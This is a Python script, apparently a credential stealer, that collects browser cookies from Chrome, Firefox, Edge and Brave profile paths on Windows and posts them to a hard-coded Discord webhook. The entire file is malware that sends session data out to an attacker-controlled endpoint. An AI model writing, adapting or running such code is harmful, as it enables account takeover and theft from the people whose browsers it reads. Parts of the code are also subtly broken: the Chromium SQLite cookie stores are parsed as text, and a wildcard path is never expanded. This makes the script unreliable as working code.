import os
import re
import requests
from discord_webhook import DiscordWebhook

# Define the path to common locations where tokens/cookies are stored
paths = [
    os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"),
    os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite"),
    os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"),
    os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies")
]

# Define the Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1410001482262118421/DdzJLVU3vfQw62Z8s_0amzDQ3lI2j78_0Dyxbtsp7O7s3h0o-IY29RJvn7cpnf9nW03k'

# Function to read and parse cookies
def read_cookies(file_path):
    cookies = []
    if file_path.endswith('.sqlite'):
        import sqlite3
        conn = sqlite3.connect(file_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM moz_cookies")
        cookies = cursor.fetchall()
        conn.close()
    else:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                match = re.search(r'(\w+)\s*:\s*(\w+)', line)
                if match:
                    cookies.append((match.group(1), match.group(2)))
    return cookies

# Function to send data to Discord webhook
def send_to_webhook(data):
    webhook = DiscordWebhook(url=webhook_url, content=data)
    response = webhook.execute()
    return response

# Main function to grab tokens/cookies and send to Discord
def main():
    all_cookies = []
    for path in paths:
        if os.path.exists(path):
            cookies = read_cookies(path)
            all_cookies.extend(cookies)
    if all_cookies:
        message = "Grabbed Tokens/Cookies:\n"
        for cookie in all_cookies:
            message += f"Name: {cookie[0]}, Value: {cookie[1]}\n"
        send_to_webhook(message)
    else:
        send_to_webhook("No tokens/cookies found.")

if __name__ == "__main__":
    main()
